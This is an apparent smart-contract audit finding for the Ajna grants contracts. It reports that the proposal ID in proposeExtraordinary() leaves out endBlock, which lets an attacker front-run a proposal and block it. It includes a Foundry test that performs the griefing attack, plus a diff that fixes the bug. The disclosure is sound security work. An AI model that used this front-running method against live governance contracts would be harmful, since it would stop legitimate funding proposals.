## Tags

- bug
- 2 (Med Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- M-09

# [Adversary can prevent the creation of any extraordinary funding proposal by frontrunning `proposeExtraordinary()`](https://github.com/code-423n4/2023-05-ajna-findings/issues/260) 

# Lines of code

https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L85-L92
https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L94
https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L139-L141


# Vulnerability details

## Impact

A griefing attack can be conducted to prevent the creation of any extraordinary funding proposal, or targetting specific receivers.

The cost of performing the attack is low, only involving the gas payment for the transaction.

## Proof of Concept

`ExtraordinaryFunding::proposeExtraordinary()` hashes all its inputs except for `endBlock_` when creating the `proposalId`:

```solidity
    function proposeExtraordinary(
        uint256 endBlock_,
        address[] memory targets_,
        uint256[] memory values_,
        bytes[] memory calldatas_,
        string memory description_) external override returns (uint256 proposalId_) {

        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));
```

[Link to code](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L85-L92)

This allows an adversary to frontrun the transaction, and create an exact proposal, but with an `endBlock` that will the proposal expire instantly, in a past block or whenever they want.

```solidity
        ExtraordinaryFundingProposal storage newProposal = _extraordinaryFundingProposals[proposalId_];
        // ...
        newProposal.endBlock        = SafeCast.toUint128(endBlock_);
```

[Link to code](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L94)

Nobody will be able to vote via `ExtraordinaryFunding::voteExtraordinary`, as the transaction will revert because of `proposal.endBlock < block.number`:

```solidity
        if (proposal.startBlock > block.number || proposal.endBlock < block.number || proposal.executed) {
            revert ExtraordinaryFundingProposalInactive();
        }
```

[Link to code](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L139-L141)

With no votes, the proposal can't be executed.

## Coded Proof of Concept

This test demonstrates how an adversary can frontrun the creation of an extraordinary proposal with a value of `endBlock` that will the proposal "end" instantly, while preventing the intended proposal to be created.

Add this test to `ajna-grants/test/unit/ExtraordinaryFunding.t.sol` and run `forge test -m "testProposeExtraordinary_Frontrun"`:

```solidity
    function testProposeExtraordinary_Frontrun() external {
        // The user that will try to propose the funding
        changePrank(_tokenHolder1);

        // 14 tokenholders self delegate their tokens to enable voting on the proposals
        _selfDelegateVoters(_token, _votersArr);

        vm.roll(_startBlock + 100);

        // set proposal params
        uint256 endBlockParam = block.number + 100_000;
        uint256 tokensRequestedParam = 50_000_000 * 1e18;

        // generate proposal targets
        address[] memory targets = new address[](1);
        targets[0] = address(_token);

        // generate proposal values
        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        // generate proposal calldata
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature(
            "transfer(address,uint256)",
            _tokenHolder1,
            tokensRequestedParam
        );

        /***********************************
         *          ATTACK BEGINS          *
         ***********************************/

        // An attacker sees the proposal in the mempool and frontruns it.
        // By setting an `endBlock_ == 0`, it will create a "defeated" proposal.
        // So when the actual user tries to send the real proposal, that one will revert.
        address attacker = makeAddr("attacker");
        changePrank(attacker);
        uint256 pastEndBlockParam = 0; // @audit 
        uint256 proposalId = _grantFund.proposeExtraordinary(
            pastEndBlockParam, targets, values, calldatas, "Extraordinary Proposal for Ajna token transfer to tester address"
        );

        // Verify that the proposal is created and has a `Defeated` state
        IFunding.ProposalState proposalState = _grantFund.state(proposalId);
        assertEq(uint8(proposalState), uint8(IFunding.ProposalState.Defeated));

        /***********************************
         *           ATTACK ENDS           *
         ***********************************/

        // When the user tries to send the proposal it will always revert.
        // As a previous proposal with the same hash has been already sent, despite that having a malicious `endBlockParam`.
        changePrank(_tokenHolder1);
        vm.expectRevert(IFunding.ProposalAlreadyExists.selector);
        _grantFund.proposeExtraordinary(
            endBlockParam, targets, values, calldatas, "Extraordinary Proposal for Ajna token transfer to tester address"
        );
    }
```

## Tools Used

Manual Review

## Recommended Mitigation Steps

Add `endBlock_` to the hash of the proposal. This way there will be no impact in frontrunning the transaction, as the expected proposal will be stored.

```diff
    function proposeExtraordinary(
        uint256 endBlock_,
        address[] memory targets_,
        uint256[] memory values_,
        bytes[] memory calldatas_,
        string memory description_) external override returns (uint256 proposalId_) {

-       proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));
+       proposalId_ = _hashProposal(endBlock_, targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));
```

```diff
    function executeExtraordinary(
+       uint256 endBlock_,
        address[] memory targets_,
        uint256[] memory values_,
        bytes[] memory calldatas_,
        bytes32 descriptionHash_
    ) external nonReentrant override returns (uint256 proposalId_) {
-       proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));
+       proposalId_ = _hashProposal(endBlock_, targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));
```


## Assessed type

Other